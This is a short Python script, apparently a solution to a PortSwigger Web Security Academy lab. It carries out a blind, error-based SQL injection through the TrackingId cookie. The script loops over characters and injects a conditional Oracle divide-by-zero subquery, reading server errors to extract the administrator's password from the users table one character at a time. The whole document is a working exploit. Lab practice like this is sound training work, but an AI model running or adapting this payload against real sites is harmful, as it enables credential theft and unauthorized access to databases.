import string
import requests

def attack(url, cookie):
  print("your url is:"+url)
  print("your cookie is:"+cookie)
  lower_case = string.ascii_lowercase
  numbers = string.digits
  payload = lower_case+numbers
  password = ''
  for i in range(1,21):
      for j in payload:
          final_cookie=cookie+"'||(select case when substr(password,{},1)='{}' then to_char(1/0) else '' end from users where username='administrator')||'".format(i, j)
          cookie1 = {
            "TrackingId":final_cookie
          }
          r = requests.get(url,cookies=cookie1)
          print("Trying {} with {}".format(i, j))
          if r.status_code > 499:
              print(j)
              password = password+j
              break
      print(password)
attack("https://ac821fe51e4d9702c0196daf009b0033.web-security-academy.net/filter?category=Accessories","cFTSmPy5ZBKh7Av8")
